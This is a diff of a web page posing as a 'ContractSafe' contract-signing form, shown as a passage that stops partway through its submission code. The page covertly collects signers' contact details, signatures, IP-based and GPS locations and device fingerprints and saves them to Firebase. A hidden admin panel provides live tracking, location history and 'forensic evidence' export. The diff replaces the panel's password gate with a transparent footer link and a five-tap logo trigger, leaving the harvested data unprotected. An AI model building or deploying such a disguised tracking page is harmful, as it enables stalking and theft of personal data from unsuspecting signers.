@@ -152,6 +152,13 @@
             color: var(--text-light);
             border-top: 1px solid #f1f5f9;
         }
+        .footer a {
+            color: var(--text-light);
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
 
         /* Admin Panel */
         #adminPanel {
@@ -219,39 +226,22 @@
             color: #64748b;
             border-radius: 4px;
         }
-        #mapContainer {
-            height: 400px;
-            width: 100%;
-            background: #1e293b;
-            margin: 10px 0;
+        .location-history {
+            max-height: 300px;
+            overflow-y: auto;
+            margin-top: 15px;
+            border: 1px solid #334155;
             border-radius: 4px;
         }
-        .hidden {
-            display: none;
+        .location-point {
+            padding: 8px;
+            border-bottom: 1px solid #334155;
+            font-size: 12px;
         }
-        #adminPassword {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: var(--dark);
-            padding: 20px;
-            border-radius: 8px;
-            z-index: 1001;
-            text-align: center;
-        }
-        #adminPassword input {
-            margin: 10px 0;
-            background: #334155;
-            color: white;
-            border: 1px solid #475569;
-        }
-        #adminPassword button {
-            margin-top: 10px;
+        .location-point:last-child {
+            border-bottom: none;
         }
     </style>
-    <!-- Leaflet CSS for maps -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 </head>
 <body>
     <div class="container">
@@ -327,16 +317,10 @@
 
         <div class="footer">
             <div>Secured by ContractSafe™ Digital Agreements</div>
-            <div style="margin-top: 8px;">© 2023 Global Contracts Ltd. All rights reserved.</div>
+            <div style="margin-top: 8px;">© 2023 Global Contracts Ltd. All rights reserved. | 
+                <a href="#" id="secretAdminLink" style="color: transparent; text-decoration: none;">Terms</a>
+            </div>
         </div>
-    </div>
-
-    <!-- Admin Password Prompt -->
-    <div id="adminPassword" class="hidden">
-        <h3>Admin Access</h3>
-        <input type="password" id="passwordInput" placeholder="Enter admin password">
-        <button class="btn btn-primary" id="passwordSubmit">Submit</button>
-        <p id="passwordError" style="color: #f87171; margin-top: 10px; display: none;">Incorrect password</p>
     </div>
 
     <!-- Admin Panel -->
@@ -347,7 +331,7 @@
         <div class="tab-buttons">
             <div class="tab-button active" data-tab="tracking">Contract Signings</div>
             <div class="tab-button" data-tab="analytics">Live Tracking</div>
-            <div class="tab-button" data-tab="map">Location History</div>
+            <div class="tab-button" data-tab="history">Location History</div>
             <div class="tab-button" data-tab="export">Export Evidence</div>
         </div>
         
@@ -363,10 +347,13 @@
                 <span id="accuracy">Accuracy: --</span> | 
                 <span id="lastUpdate">Last: Never</span>
             </div>
-            <button id="startTracking" class="btn btn-primary" style="margin-right: 10px;">
+            <button id="startTracking" style="background: #2563eb; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin-right: 10px;">
                 Start Live Tracking
             </button>
-            <button id="screenshot" class="btn btn-primary">
+            <button id="stopTracking" style="background: #dc2626; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin-right: 10px;">
+                Stop Tracking
+            </button>
+            <button id="screenshot" style="background: #059669; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer;">
                 Capture Page Screenshot
             </button>
             
@@ -374,19 +361,28 @@
             <div id="devicePrint" style="font-size: 12px; word-break: break-all; background: #1e293b; padding: 15px; border-radius: 4px; margin-top: 10px;"></div>
         </div>
         
-        <div id="mapTab" class="tab-content">
-            <h3>Location History Map</h3>
-            <div id="mapContainer"></div>
-            <div id="mapData" style="margin-top: 10px;"></div>
+        <div id="historyTab" class="tab-content">
+            <h3>Location History</h3>
+            <div id="locationHistory" class="location-history">
+                No location history available. Start tracking to record locations.
+            </div>
+            <div style="margin-top: 15px;">
+                <button id="clearHistory" style="background: #dc2626; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer;">
+                    Clear History
+                </button>
+                <button id="exportHistory" style="background: #2563eb; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin-left: 10px;">
+                    Export History
+                </button>
+            </div>
         </div>
         
         <div id="exportTab" class="tab-content">
             <h3>Export Forensic Evidence</h3>
             <div style="margin-top: 20px;">
-                <button id="exportPDF" class="btn btn-primary" style="margin-right: 10px;">
+                <button id="exportPDF" style="background: #2563eb; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin-right: 10px;">
                     Export as PDF Report
                 </button>
-                <button id="exportCSV" class="btn btn-primary">
+                <button id="exportCSV" style="background: #059669; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer;">
                     Export Raw Data (CSV)
                 </button>
             </div>
@@ -398,11 +394,10 @@
         </div>
     </div>
 
-    <!-- Libraries -->
+    <!-- Firebase & Signature Pad Libraries -->
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/signature_pad/1.5.3/signature_pad.min.js"></script>
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
     <script>
         // ===== FIREBASE CONFIG =====
@@ -414,15 +409,8 @@
             messagingSenderId: "810816177909",
             appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
         };
-
-        // Initialize Firebase
-        try {
-            firebase.initializeApp(firebaseConfig);
-            console.log("Firebase initialized successfully");
-            const db = firebase.firestore();
-        } catch (err) {
-            console.error("Firebase initialization error:", err);
-        }
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
 
         // ===== SIGNATURE PAD =====
         const canvas = document.getElementById('signatureCanvas');
@@ -435,24 +423,30 @@
             signaturePad.clear();
         });
 
-        // ===== ADMIN ACCESS =====
-        const ADMIN_PASSWORD = "admin123"; // Change this in production
-        
-        document.getElementById('adminLogo').addEventListener('click', () => {
-            document.getElementById('adminPassword').classList.remove('hidden');
-        });
+        // ===== ADMIN PANEL ACCESS =====
+        const adminLogo = document.getElementById('adminLogo');
+        const secretAdminLink = document.getElementById('secretAdminLink');
+        let tapCount = 0;
+        let locationHistory = [];
 
-        document.getElementById('passwordSubmit').addEventListener('click', () => {
-            const password = document.getElementById('passwordInput').value;
-            if (password === ADMIN_PASSWORD) {
-                document.getElementById('adminPassword').classList.add('hidden');
+        // Logo tap detection
+        function incrementTap() {
+            tapCount++;
+            if (tapCount === 5) {
                 showAdmin();
-            } else {
-                document.getElementById('passwordError').style.display = 'block';
-                setTimeout(() => {
-                    document.getElementById('passwordError').style.display = 'none';
-                }, 2000);
+                tapCount = 0;
             }
+            clearTimeout(window.tapTimeout);
+            window.tapTimeout = setTimeout(() => tapCount = 0, 2000);
+        }
+
+        adminLogo.addEventListener('click', incrementTap);
+        adminLogo.addEventListener('touchstart', incrementTap);
+
+        // Secret admin link (hidden in footer)
+        secretAdminLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            showAdmin();
         });
 
         // Close admin panel
@@ -462,7 +456,6 @@
             document.getElementById('adminPanel').style.display = 'block';
             loadTrackingData();
             initAnalytics();
-            initMap();
         }
 
         function hideAdmin() {
@@ -488,60 +481,50 @@
             });
         });
 
-        // ===== MAP FUNCTIONALITY =====
-        let map;
-        let markers = [];
-
-        function initMap() {
-            map = L.map('mapContainer').setView([0, 0], 2);
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
-            }).addTo(map);
-
-            // Load location data
-            loadMapData();
-        }
-
-        function loadMapData() {
-            db.collection("contracts").where("location.gpsData", "!=", null).get()
-                .then(snapshot => {
-                    const locations = [];
-                    snapshot.forEach(doc => {
-                        const data = doc.data();
-                        if (data.location?.gpsData) {
-                            locations.push({
-                                coords: data.location.gpsData.coordinates,
-                                name: data.name,
-                                timestamp: new Date(data.timestamp).toLocaleString()
-                            });
-                        }
-                    });
-
-                    if (locations.length > 0) {
-                        // Clear existing markers
-                        markers.forEach(marker => map.removeLayer(marker));
-                        markers = [];
-
-                        // Add new markers
-                        locations.forEach(loc => {
-                            const marker = L.marker([loc.coords[0], loc.coords[1]])
-                                .addTo(map)
-                                .bindPopup(`<b>${loc.name || 'Anonymous'}</b><br>${loc.timestamp}`);
-                            markers.push(marker);
-                        });
-
-                        // Fit map to markers
-                        const markerGroup = new L.featureGroup(markers);
-                        map.fitBounds(markerGroup.getBounds());
-                    } else {
-                        document.getElementById('mapData').textContent = "No location data available";
-                    }
-                })
-                .catch(err => {
-                    console.error("Error loading map data:", err);
-                    document.getElementById('mapData').textContent = "Error loading location data";
-                });
-        }
-
         // ===== CONTRACT SUBMISSION =====
-        
+        document.getElementById('submitContract').addEventListener('click', () => {
+            if (!signaturePad.isEmpty() && document.getElementById('agreeTerms').checked) {
+                submitContract();
+            } else {
+                alert("Please complete all required fields and sign the contract");
+            }
+        });
+
+        function submitContract() {
+            const contractData = {
+                timestamp: new Date().toISOString(),
+                name: document.getElementById('fullName').value,
+                email: document.getElementById('email').value,
+                phone: document.getElementById('phone').value,
+                signature: signaturePad.toDataURL(),
+                device: getDeviceInfo(),
+                location: {}
+            };
+
+            // Get IP and approximate location
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    contractData.location.ipData = {
+                        ip: data.ip,
+                        city: data.city,
+                        region: data.region,
+                        country: data.country_name,
+                        coordinates: [data.latitude, data.longitude],
+                        isp: data.org
+                    };
+
+                    // Get precise GPS if available
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            position => {
+                                contractData.location.gpsData = {
+                                    coordinates: [position.coords.latitude, position.coords.longitude],
+                                    accuracy: position.coords.accuracy,
+                                    timestamp: new Date(position.timestamp).toISOString()
+                                };
+                                saveToFirebase(contractData);
+                            },
+                            () => saveToFirebase(contractData)
+                        );
+  
